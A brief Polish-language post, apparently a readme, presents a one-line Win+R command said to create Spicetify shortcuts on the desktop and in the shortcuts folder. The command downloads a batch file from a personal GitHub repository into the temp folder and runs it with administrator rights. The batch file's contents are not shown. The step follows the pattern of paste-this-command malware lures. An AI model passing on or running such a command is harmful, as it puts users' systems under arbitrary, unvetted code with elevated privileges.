Tworzy link na pulpicie i w folderze skrótów przez co łatwo go znaleść Komenda do win + r:                                                                                                   
                                                                                                                                   
powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/asgbdhh12-blip/spicetifylink/refs/heads/main/p.bat' -OutFile $env:TEMP\p.bat; Start-Process 'cmd.exe' -ArgumentList '/c',$env:TEMP\p.bat -Verb RunAs"
